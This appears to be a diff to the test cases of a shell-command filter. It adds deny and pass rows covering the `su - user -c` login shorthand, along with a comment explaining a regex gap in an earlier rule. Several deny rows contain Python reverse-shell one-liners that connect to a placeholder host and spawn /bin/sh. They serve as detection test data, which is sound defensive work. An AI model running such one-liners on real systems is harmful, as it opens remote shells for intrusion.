@@ -1031,3 +1031,13 @@ deny	R7 quote spanning two lines is not a heredoc opener	echo "x__NL__<<EOF"__NL
 deny	R7 here-string is not a heredoc opener	echo <<< EOF__NL__python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('h',1));os.dup2(s.fileno(),0);subprocess.call(['/bin/sh'])"__NL__EOF
 pass	R7-fp python forking socket server	python3 -c "import socket,os;s=socket.socket();s.bind(('',8080));s.listen(1);os.fork()"
 pass	R7-fp node cluster fork with an http server	node -e "const cluster=require('cluster'),http=require('http');if(cluster.isPrimary){cluster.fork()}else{http.createServer((q,s)=>s.end('ok')).listen(0)}"
+
+# R8 (0.79.0 final verification V-H1): the R7 `su` rule modelled a flag as
+# `-[a-zA-Z-]+`, which requires a letter after the dash, so the login shorthand
+# `su - <user> -c` matched neither the flag group nor the username token and the
+# payload never reached the rewrite. `su - deploy -c` is the idiomatic "become a
+# user with a login shell", not an evasion, and it denied on 0.78.0.
+deny	R8 su login shorthand with a user	su - deploy -c "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"h\",1));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'"
+deny	R8 su login shorthand without a user	su - -c "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"h\",1));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'"
+pass	R8-fp su login shell with no -c payload	su - deploy
+pass	R8-fp su spelling quoted in a commit message	git commit -m "runbook: su - deploy -c 'systemctl restart api'"
